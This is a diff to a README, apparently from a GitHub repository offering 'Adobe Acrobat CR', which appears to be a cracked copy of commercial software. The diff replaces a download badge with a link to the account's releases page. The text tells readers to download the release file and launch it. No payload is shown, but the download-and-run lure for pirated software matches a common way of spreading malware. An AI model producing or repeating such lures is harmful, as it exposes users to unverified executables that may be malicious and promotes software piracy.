@@ -37,7 +37,7 @@ In this repository, you will find resources related to Adobe Acrobat, an industr
 
 ## 🔗 Download the Release
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Release](https://github.com/mosalad21/Adobe-Acrobat-cr/releases)](https://github.com/mosalad21/Adobe-Acrobat-cr/releases)
 
 📌 **Note:** The link provided above leads to the downloadable release file. Ensure to download and launch it to access the latest version of Adobe Acrobat CR. If the link is not functional, please check the "Releases" section of the repository for alternative download options.
 
